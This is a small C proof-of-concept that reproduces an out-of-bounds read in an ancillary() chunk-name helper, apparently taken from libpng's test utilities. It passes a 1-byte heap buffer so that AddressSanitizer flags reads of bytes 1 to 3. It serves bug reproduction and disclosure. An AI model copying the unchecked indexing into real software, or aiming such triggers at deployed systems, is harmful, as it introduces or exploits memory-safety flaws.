#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

/* Minimal typedefs/macros to mirror the vulnerable code path */
typedef uint32_t png_uint_32;
typedef unsigned char png_byte;

/* Equivalent to libpng's macros used by ancillary() */
#define PNG_U32(a,b,c,d) \
    ((((png_uint_32)(a)) << 24) | (((png_uint_32)(b)) << 16) | \
     (((png_uint_32)(c)) << 8)  |  ((png_uint_32)(d)))

#define PNG_CHUNK_ANCILLARY(c) (((c) & 0x20000000U) != 0)

/* Vulnerable function (from contrib/libtests/pngunknown.c) */
static int ancillary(const char *name)
{
    /* BUG: indexes name[0..3] without validating length */
    return PNG_CHUNK_ANCILLARY(PNG_U32(name[0], name[1], name[2], name[3]));
}

int main(void)
{
    /* Allocate a buffer that is too small (1 byte) for a 4-byte chunk name */
    char *name = (char*)malloc(1);
    if (!name) {
        perror("malloc");
        return 1;
    }

    /* Fill the single byte; the function will read name[1], name[2], name[3]
       which are out-of-bounds. */
    name[0] = 'a';

    /* Call the vulnerable function; ASan should flag an OOB read here */
    volatile int r = ancillary(name);
    (void)r; /* prevent unused warning */

    /* If ASan didn't abort, print something (unlikely) */
    printf("ancillary returned: %d\n", r);

    free(name);
    return 0;
}
